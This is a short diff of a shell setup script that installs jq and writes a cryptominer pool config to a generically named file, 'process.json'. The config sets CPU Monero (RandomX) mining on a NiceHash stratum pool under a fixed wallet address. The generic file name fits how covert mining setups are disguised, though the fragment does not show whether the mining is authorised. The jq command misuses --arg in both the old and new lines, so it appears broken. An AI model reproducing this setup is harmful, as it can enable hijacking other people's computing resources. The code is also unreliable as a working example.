@@ -13,4 +13,4 @@
 sudo apt update
 sudo apt install jq
 touch process.json
-jq -n --arg '{ "autosave": true, "cpu": true, "opencl": false, "cuda": false, "pools": [ { "coin": null, "algo": "rx/0", "url": "stratum+tcp://randomxmonero.eu-west.nicehash.com:3380", "user": "35qheUaRktAzmvTyBdpzih4moF5E3yDb6K", "pass": "x", "tls": false, "keepalive": true, "nicehash": true } ] }' > process.json
+jq -n --arg "$mydata" '{ "autosave": true, "cpu": true, "opencl": false, "cuda": false, "pools": [ { "coin": null, "algo": "rx/0", "url": "stratum+tcp://randomxmonero.eu-west.nicehash.com:3380", "user": "35qheUaRktAzmvTyBdpzih4moF5E3yDb6K", "pass": "x", "tls": false, "keepalive": true, "nicehash": true } ] }' > process.json
